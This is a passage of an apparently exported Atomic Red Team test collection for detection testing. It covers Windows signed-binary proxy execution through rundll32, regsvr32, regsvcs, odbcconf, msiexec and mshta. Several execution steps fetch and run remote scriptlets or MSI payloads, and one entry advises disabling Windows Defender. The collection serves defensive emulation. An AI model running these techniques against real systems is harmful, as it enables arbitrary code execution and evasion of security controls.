CVE-2021-40444. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_url | Url to download the DLL | Url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll | \n | input_file | DLL File | String | PathToAtomicsFolder\\T1047\\bin\\calc.dll | "}, "executionSteps": [{"description": "rundll32.exe shell32.dll,Control_RunDLL #{input_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv"], "tags": []}, {"data": {"name": "Rundll32 syssetup.dll Execution", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_to_execute | Local location of inf file | String | PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf | "}, "executionSteps": [{"description": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 #{inf_to_execute}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Rundll32 setupapi.dll Execution", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_to_execute | Local location of inf file | String | PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf | "}, "executionSteps": [{"description": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 #{inf_to_execute}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Rundll32 ieadvpack.dll Execution", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_to_execute | Local location of inf file | String | PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf | "}, "executionSteps": [{"description": "rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Rundll32 execute VBscript command using Ordinal number", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_execute | Command for rundll32.exe to execute | String | calc.exe | "}, "executionSteps": [{"description": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv"], "tags": []}, {"data": {"name": "Rundll32 execute VBscript command", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command_to_execute | Command for rundll32.exe to execute | String | calc.exe | "}, "executionSteps": [{"description": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Rundll32 execute JavaScript Remote Payload With GetObject", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_url | location of the payload | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct | "}, "executionSteps": [{"description": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Rundll32 advpack.dll Execution", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | inf_to_execute | Local location of inf file | String | PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf | "}, "executionSteps": [{"description": "rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Launches an executable using Rundll32 and pcwutl.dll", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | exe_to_launch | Path of the executable to launch | Path | %windir%\\System32\\notepad.exe | "}, "executionSteps": [{"description": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Execution of non-dll using rundll32.exe", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Rundll32.exe running non-dll \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_url | Url to download the DLL | Url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll | \n | input_file | Non-dll file | String | C:\\Users\\$env:username\\Downloads\\calc.png | "}, "executionSteps": [{"description": "rundll32.exe #{input_file}, StartW\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv"], "tags": []}, {"data": {"name": "Execution of HTA and VBS Files using Rundll32 and URL.dll", "shortName": "T1218.011", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "rundll32.exe url.dll,OpenURL PathToAtomicsFolder\\T1218.011\\src\\index.hta\nrundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\n", "successCriteria": null}], "techniqueIds": ["clacwm5pg02nq29mq9yt1azdv", "clacwm2cq00rh29mq0gb47z9g"], "tags": []}, {"data": {"name": "Regsvr32 Silent DLL Install Call DllRegisterServer", "shortName": "T1218.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_name | Name of DLL to Install | String | PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll | \n | regsvr32path | Default location of Regsvr32.exe | String | C:\\Windows\\system32 | \n | regsvr32name | Default name of Regsvr32.exe | String | regsvr32.exe | "}, "executionSteps": [{"description": "#{regsvr32path}\\#{regsvr32name} /s /i #{dll_name}", "successCriteria": null}], "techniqueIds": ["clacwm6k203k629mqa2lo4ha0", "clacwm2bg00qk29mq51xfhuzq"], "tags": []}, {"data": {"name": "Regsvr32 remote COM scriptlet execution", "shortName": "T1218.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url | URL to hosted sct file | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct | \n | regsvr32path | Default location of Regsvr32.exe | Path | C:\\Windows\\system32 | \n | regsvr32name | Default name of Regsvr32.exe | String | regsvr32.exe | "}, "executionSteps": [{"description": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{url} scrobj.dll\n", "successCriteria": null}], "techniqueIds": ["clacwm6k203k629mqa2lo4ha0", "clacwm2bg00qk29mq51xfhuzq"], "tags": []}, {"data": {"name": "Regsvr32 Registering Non DLL", "shortName": "T1218.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_file | Path to renamed dll file to be registered | Path | %temp%\\shell32.jpg | \n | regsvr32path | Default location of Regsvr32.exe | Path | C:\\Windows\\system32 | \n | regsvr32name | Default name of Regsvr32.exe | String | regsvr32.exe | "}, "executionSteps": [{"description": "#{regsvr32path}\\#{regsvr32name} /s #{dll_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6k203k629mqa2lo4ha0", "clacwm2bg00qk29mq51xfhuzq"], "tags": []}, {"data": {"name": "Regsvr32 local DLL execution", "shortName": "T1218.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_name | Name of DLL to Execute, DLL Should export DllRegisterServer | Path | PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll | \n | regsvr32path | Default location of Regsvr32.exe | Path | C:\\Windows\\system32 | \n | regsvr32name | Default name of Regsvr32.exe | String | regsvr32.exe | "}, "executionSteps": [{"description": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\\#{regsvr32name} /s #{dll_name} )\n", "successCriteria": null}], "techniqueIds": ["clacwm6k203k629mqa2lo4ha0", "clacwm2bg00qk29mq51xfhuzq"], "tags": []}, {"data": {"name": "Regsvr32 local COM scriptlet execution", "shortName": "T1218.010", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filename | Name of the local file, include path. | Path | PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct | \n | regsvr32path | Default location of Regsvr32.exe | Path | C:\\Windows\\system32 | \n | regsvr32name | Default name of Regsvr32.exe | String | regsvr32.exe | "}, "executionSteps": [{"description": "#{regsvr32path}\\#{regsvr32name} /s /u /i:#{filename} scrobj.dll\n", "successCriteria": null}], "techniqueIds": ["clacwm6k203k629mqa2lo4ha0", "clacwm2bg00qk29mq51xfhuzq"], "tags": []}, {"data": {"name": "Regsvcs Uninstall Method Call Test", "shortName": "T1218.009", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Location of the payload | Path | $Env:TEMP\\T1218.009.dll | \n | source_file | Location of the CSharp source_file | Path | PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs | "}, "executionSteps": [{"description": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library /keyfile:$env:Temp\\key.snk #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6m903mn29mqbawh5hr0", "clacwm2bd00qi29mqc4103w36"], "tags": []}, {"data": {"name": "Regasm Uninstall Method Call Test", "shortName": "T1218.009", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Location of the payload | Path | %tmp%\\T1218.009.dll | \n | source_file | Location of the CSharp source_file | Path | PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs | "}, "executionSteps": [{"description": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"#{output_file}\" /target:library #{source_file}\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm6m903mn29mqbawh5hr0", "clacwm2bd00qi29mqc4103w36"], "tags": []}, {"data": {"name": "Odbcconf.exe - Load Response File", "shortName": "T1218.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | rsp_file_name | Response file name to load | String | T1218.008.rsp | \n | rsp_file_path | Response file path | String | PathToAtomicsFolder\\T1218.008\\bin\\ | "}, "executionSteps": [{"description": "cd #{rsp_file_path}\nodbcconf.exe -f #{rsp_file_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm690037s29mqdl1faueh"], "tags": []}, {"data": {"name": "Odbcconf.exe - Execute Arbitrary DLL", "shortName": "T1218.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute arbitrary DLL file stored locally.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_payload | DLL to execute | Path | PathToAtomicsFolder\\T1218.008\\src\\Win32\\T1218-2.dll | "}, "executionSteps": [{"description": "odbcconf.exe /S /A {REGSVR \"#{dll_payload}\"}\n", "successCriteria": null}], "techniqueIds": ["clacwm690037s29mqdl1faueh", "clacwm26q00me29mq63lrdhmp"], "tags": []}, {"data": {"name": "WMI Win32_Product Class - Execute Local MSI file with embedded VBScript", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi | \n | action | Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n | String | Install | "}, "executionSteps": [{"description": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "WMI Win32_Product Class - Execute Local MSI file with embedded JScript", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi | \n | action | Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n | String | Install | "}, "executionSteps": [{"description": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi | \n | action | Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n | String | Install | "}, "executionSteps": [{"description": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "WMI Win32_Product Class - Execute Local MSI file with an embedded DLL", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi | \n | action | Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.\n | String | Install | "}, "executionSteps": [{"description": "Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_payload | DLL to execute that has an implemented DllUnregisterServer function | Path | PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | "}, "executionSteps": [{"description": "#{msi_exe} /z \"#{dll_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_payload | DLL to execute that has an implemented DllRegisterServer function | Path | PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | "}, "executionSteps": [{"description": "#{msi_exe} /y \"#{dll_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Remote MSI file", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | String | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | "}, "executionSteps": [{"description": "#{msi_exe} /q /i \"#{msi_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud", "clacwm24d00kn29mqdee2gw6d"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Local MSI file with embedded VBScript", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | \n | action | Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n | String | i | "}, "executionSteps": [{"description": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Local MSI file with embedded JScript", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing embedded JScript code using msiexec.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | \n | action | Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n | String | i | "}, "executionSteps": [{"description": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Local MSI file with an embedded EXE", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing an embedded EXE using msiexec.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | \n | action | Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n | String | i | "}, "executionSteps": [{"description": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Local MSI file with an embedded DLL", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes an MSI containing an embedded DLL using msiexec.exe\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi | \n | msi_exe | MSIExec File Path | Path | c:\\windows\\system32\\msiexec.exe | \n | action | Specifies the MSI action to perform: i (install), a (admin), j (advertise). The included MSI is designed to support all three action types.\n | String | i | "}, "executionSteps": [{"description": "#{msi_exe} /q /#{action} \"#{msi_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5z502xu29mq2am209ud"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Local MSI file", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute arbitrary MSI file. Commonly seen in application installation. The MSI opens notepad.exe when sucessfully executed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | msi_payload | MSI file to execute | Path | PathToAtomicsFolder\\T1218.007\\src\\Win32\\T1218.msi | "}, "executionSteps": [{"description": "msiexec.exe /q /i \"#{msi_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm24d00kn29mqdee2gw6d"], "tags": []}, {"data": {"name": "Msiexec.exe - Execute Arbitrary DLL", "shortName": "T1218.007", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Execute arbitrary DLL file stored locally. Commonly seen in application installation.\nUpon execution, a window titled \"Boom!\" will open that says \"Locked and Loaded!\". For 32 bit systems change the dll_payload argument to the Win32 folder.\nBy default, if the src folder is not in place, it will download the 64 bit version.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dll_payload | DLL to execute | Path | PathToAtomicsFolder\\T1218.007\\src\\x64\\T1218.dll | "}, "executionSteps": [{"description": "msiexec.exe /y \"#{dll_payload}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm24d00kn29mqdee2gw6d"], "tags": []}, {"data": {"name": "Mshta used to Execute PowerShell", "shortName": "T1218.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | message | Encoded message to include | String | Hello,%20MSHTA! | \n | seconds_to_sleep | How many seconds to sleep/wait | Integer | 5 | "}, "executionSteps": [{"description": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\"\"\"))</script>'\"\n", "successCriteria": null}], "techniqueIds": 